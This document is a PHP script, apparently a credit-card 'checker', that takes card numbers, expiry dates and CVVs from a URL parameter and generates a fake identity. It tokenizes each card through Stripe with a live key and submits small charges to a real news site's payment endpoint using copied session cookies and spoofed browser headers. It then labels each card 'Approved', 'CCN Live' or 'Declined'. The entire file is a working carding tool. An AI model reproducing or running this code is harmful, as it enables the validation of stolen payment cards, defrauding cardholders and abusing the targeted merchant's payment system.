<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$telegramId = $_GET['telegram'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];

// BIN Lookup
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$emoji = GetStr($fim, '"emoji":"', '"');
curl_close($ch);

// Additional BIN lookup
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $type - $brand - $country $emoji";

// First request
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br, zstd');
$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132", "Brave";v="132"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'guid=138d6f44-2a3d-4e0c-b572-7bc0d41f940047ed13&muid=a8249356-407d-40b3-98f9-ed3c2fa248973aaf3a&sid=752d576d-019a-40ff-82fa-f430d286df50ab5084&referrer=https%3A%2F%2Fexpose-news.com&time_on_page=33161&card[name]=liam+healy+&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&payment_user_agent=stripe.js%2F11beb56b35%3B+stripe-js-v3%2F11beb56b35%3B+card-element&pasted_fields=number%2Ccvc&key=pk_live_51I7OeOCA4eWk916cnT490PEfhmYY4ybN9DztEGLGOE9axRZf8hAVGq69SRkzb9bqzku6iBiZ2B8T3Al2JRQN2w0M00Byeg1aWQ&_stripe_version=2024-12-18.acacia');

$result1 = curl_exec($ch);
$data = json_decode($result1, true);

if (isset($data['id'])) {
    $id = $data['id'];
}

// Second request
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://expose-news.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Authority: expose-news.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.8';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://expose-news.com';
$headers[] = 'Cookie: asp_transient_id=bff0779ff91a27dffdf267fea8af3ec7; __stripe_mid=a8249356-407d-40b3-98f9-ed3c2fa248973aaf3a; wp-ps-session=710a3b85366d93d1350b098bc72d94de; __stripe_sid=752d576d-019a-40ff-82fa-f430d286df50ab5084';
$headers[] = 'Referer: https://expose-news.com/asp-payment-box/?product_id=253886';
$headers[] = 'Sec-Ch-Ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=asp_pp_confirm_token&asp_token_id='.$id.'&product_id=253886&currency=GBP&amount=300&billing_details={"name":"liam%20healy%20","email":"jaxxyfroam%40gmail.com"}&token=17ee9fd08790aae23bcab975db75e813');

$result2 = curl_exec($ch);
$data = json_decode($result2, true);

// Card Response
header('Content-Type: application/json');

$response = array(
    'success' => false,
    'message' => 'Card Declined',
    'details' => null
);

// Check for error in first request
if (strpos($result1, 'error') !== false) {
    $error_data = json_decode($result1, true);
    if (isset($error_data['error']['message'])) {
        $response['message'] = $error_data['error']['message'];
        echo json_encode($response);
        exit;
    }
}

// Check second request response
if (strpos($result2, '"success":true')) {
    $response['success'] = true;
    $response['message'] = 'Card Approved';
    $response['details'] = 'AUTH DONE 3$';
}
elseif (strpos($result2, 'security code') !== false) {
    $response['success'] = true;
    $response['message'] = 'CCN Live';
    $response['details'] = 'Invalid Security Code';
}
elseif (strpos($result2, 'insufficient_funds') !== false) {
    $response['success'] = true;
    $response['message'] = 'Card Approved';
    $response['details'] = 'Insufficient Funds';
}
elseif (strpos($result2, 'invalid_account') !== false) {
    $response['message'] = 'Invalid Account';
}
elseif (strpos($result2, 'do_not_honor') !== false) {
    $response['message'] = 'Do Not Honor';
}
elseif (strpos($result2, 'generic_decline') !== false) {
    $response['message'] = 'Card Declined';
}
else {
    $response['message'] = 'Card Declined';
    if (isset($data['error']['message'])) {
        $response['details'] = $data['error']['message'];
    }
}

echo json_encode($response);
curl_close($ch);